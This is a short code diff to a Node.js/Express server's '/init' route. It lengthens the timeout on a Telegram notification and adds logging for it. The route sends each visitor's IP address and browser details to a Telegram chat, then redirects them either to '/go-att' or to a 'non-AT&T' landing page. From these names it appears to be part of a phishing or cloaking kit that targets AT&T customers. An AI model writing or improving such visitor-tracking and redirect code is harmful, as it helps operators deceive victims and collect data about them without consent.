@@ -276,7 +276,9 @@ app.get('/init', async (req, res) => {
             chat_id: TELEGRAM_CHAT_ID,
             text: `✨ *FORCED REDIRECT VISIT* \n\n📍 *IP:* ${clientIp}\n💻 *Browser:* ${userAgent}\n🕒 *Time:* ${new Date().toLocaleString()}`,
             parse_mode: 'Markdown'
-        }, { timeout: 4000 }).catch(e => console.error('[Init] Forced notification failed:', e.message));
+        }, { timeout: 5000 })
+        .then(() => console.log(`[Init] Forced Telegram notification sent for IP: ${clientIp}`))
+        .catch(e => console.error(`[Init] Forced Telegram notification FAILED for IP: ${clientIp} | Error:`, e.response?.data || e.message));
         
         return res.json({ redirect: '/go-att' });
     }
@@ -327,7 +329,9 @@ app.get('/init', async (req, res) => {
         chat_id: TELEGRAM_CHAT_ID,
         text: message,
         parse_mode: 'Markdown'
-    }, { timeout: 4000 }).catch(e => console.error('[Init] Telegram notification failed:', e.message));
+    }, { timeout: 5000 })
+    .then(() => console.log(`[Init] Telegram notification sent successfully for IP: ${clientIp}`))
+    .catch(e => console.error(`[Init] Telegram notification FAILED for IP: ${clientIp} | Error:`, e.response?.data || e.message));
 
     // 4. FINAL REDIRECT LOGIC
     let targetUrl = NON_ATT_LANDING_PAGE;
